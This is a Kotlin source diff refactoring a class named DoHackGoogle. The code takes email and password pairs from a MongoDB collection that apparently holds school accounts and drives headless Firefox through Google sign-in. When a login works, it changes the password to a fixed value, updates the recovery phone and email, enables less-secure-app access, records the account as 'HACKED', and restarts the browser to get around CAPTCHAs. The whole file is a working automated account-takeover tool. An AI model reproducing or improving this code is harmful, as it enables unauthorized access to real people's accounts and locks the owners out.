@@ -10,7 +10,8 @@ import net.scr0pt.crawl.school.random
 import net.scr0pt.selenium.GoogleResponse
 import net.scr0pt.thirdservice.mongodb.MongoConnection
 import org.bson.Document
-import net.scr0pt.utils.webdriver.Browser
+
+import net.scr0pt.utils.webdriver.DriverManager
 import org.jsoup.select.Selector.selectFirst
 
 
@@ -20,19 +21,19 @@ fun main() {
 
 
 class DoHackGoogle() {
-    var driver = Browser.firefox
+    val driverManager = DriverManager(driverType = DriverManager.BrowserType.firefox, driverHeadless = true)
     val mongoClient = MongoClients.create(MongoConnection.eduConnection)
     val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
     val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")
 
-     fun run() {
+    fun run() {
         while (true) {
             collection.random(org.bson.Document("login_status", null).append("email_status", null))
                     ?.let { googleRun(it) }
         }
     }
 
-     fun googleRun(doc: org.bson.Document) {
+    fun googleRun(doc: org.bson.Document) {
         val email = doc.getString("email") ?: return
         println(email)
         val pass = doc.getString("pass") ?: return
@@ -41,20 +42,16 @@ class DoHackGoogle() {
         val newPassword = "TheMatrix@1999"
 
 
-        PageManager(driver,
+        PageManager(driverManager,
                 "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
         ).apply {
-            addPageList(arrayListOf<Page>(
-                    LoginEnterEmailPage(email) {
-                        println("enter email success")
-                    },
+            addPageList(arrayListOf(
+                    LoginEnterEmailPage(email),
                     LoginEnterPasswordPage(pass) {
-                        println("enter password success")
                         update(email, "login_status", "PASSWORD_CORRECT")
                     },
                     WellcomeToNewAccount {
                         update(email, "email_status", "HACKED")
-                        println("WellcomeToNewAccount success")
                     },
                     ChangePasswordFirstTime(newPassword) {
                         update(email, "email_status", "HACKED")
@@ -65,7 +62,6 @@ class DoHackGoogle() {
                         println("EnterPasswordFirstTimeChanged success")
                     },
                     ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE) {
-                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                         println("ProtectYourAccount success")
                     },
                     ProtectYourAccountUpdatePhone() {
@@ -80,7 +76,6 @@ class DoHackGoogle() {
                         println("ProtectYourAccountUpdateRecoverEmailSuccess success")
                     },
                     GoogleSearch {
-                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                         println("GoogleSearch success")
                     },
                     AccountDisable {
@@ -106,7 +101,7 @@ class DoHackGoogle() {
                     }
             ))
 
-            generalWatingResult = {pageStatus ->
+            generalWatingResult = { pageStatus ->
                 if ((pageStatus.doc?.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
                     GoogleResponse.RECAPTCHA()
                 } else Response.WAITING()
@@ -117,7 +112,7 @@ class DoHackGoogle() {
                     is Response.OK -> {
                         update(email, "email_status", "HACKED")
                         allowLessSecureApps(driver, email, collection)
-                        driver.renew(Browser.firefox)
+                        driver.renew()
                     }
                     is GoogleResponse.NOT_FOUND_EMAIL -> {
                         update(email, "email_status", "NOT_EXIST")
@@ -126,7 +121,7 @@ class DoHackGoogle() {
                         update(email, "login_status", "PASSWORD_INCORRECT")
                     }
                     is GoogleResponse.RECAPTCHA -> {
-                        driver.renew(Browser.firefox)
+                        driver.renew()
                     }
                     is Response.NOT_FOUND_ELEMENT -> {
                     }
